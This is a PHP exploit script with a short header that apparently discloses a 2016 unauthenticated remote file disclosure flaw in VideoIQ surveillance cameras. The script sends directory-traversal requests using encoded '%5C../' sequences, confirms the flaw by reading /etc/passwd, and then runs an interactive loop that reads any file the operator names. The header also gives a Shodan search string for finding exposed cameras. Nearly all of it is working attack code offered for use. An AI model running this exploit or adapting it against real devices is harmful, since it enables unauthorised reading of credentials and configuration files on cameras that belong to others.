<?php
# VideoIQ Camera Remote File Disclosure 0day Exploit
# 
# VideoIQ develops intelligent video surveillance cameras using edge video IP security cameras paired with video analytics.
#
# Exploit Coded & Bug discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman) 

# Date 20/08/2016
# Shodan Dork 		: title:"VideoIQ Camera Login"
# Version Affected 	: All Versions
# Vendor Homepage	: http://avigilon.com
# CVE				: N/A
# Description		: VideoIQ is vulnerable to remote file disclosure which allows to any unauthenticated user read any file system including file configurations.
###
# Exploit code:

error_reporting(0);

$error[0] = "[!] This script is intended to be launched from the cli.";
 
if(php_sapi_name() <> "cli")
	die($error[0]);
     
if($argc < 3) {
	echo("\nUsage  : php {$argv[0]} <host> <port>");
	echo("\nExample: php {$argv[0]} localhost 8080");
	die();
}

if(isset($argv[1]) && isset($argv[2])) {
	$host = $argv[1];
	$port = $argv[2];
}

$pack = "GET /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C..{FILE_PATH} HTTP/1.0\r\n";
$pack.= "Host: {$host}\r\n";
$pack.= "Connection: close\r\n\r\n";

while(1) {
	if(strstr(http_send($host, $port, preg_replace("/{FILE_PATH}/", '/etc/passwd', $pack)), 'root')) {
		echo("\nAnonymous@{$host}:~# cat ");
		if(($file = trim(fgets(STDIN))) == "exit")
			break;
		$ret = http_send($host, $port, preg_replace("/{FILE_PATH}/", $file, $pack));
		if(strstr($ret, '<title>Error 404 NOT_FOUND</title>') || strstr($ret, '<p>Problem accessing') || strstr($ret, '<h2>HTTP ERROR 404</h2>')) {
			echo("cat: {$file}: No such file or directory");
		} else {
			echo($ret);
		}
	} else {
		echo("[-] Server likely not vulnerable.\n");
		break;
	}
}

function http_send($host, $port, $pack) {
	if(!($sock = fsockopen($host, $port)))
		die("\n[-] No response from {$host}\n");
	fwrite($sock, $pack);
	$response = explode("\r\n\r\n", stream_get_contents($sock));
	return($response[1]);
}
?>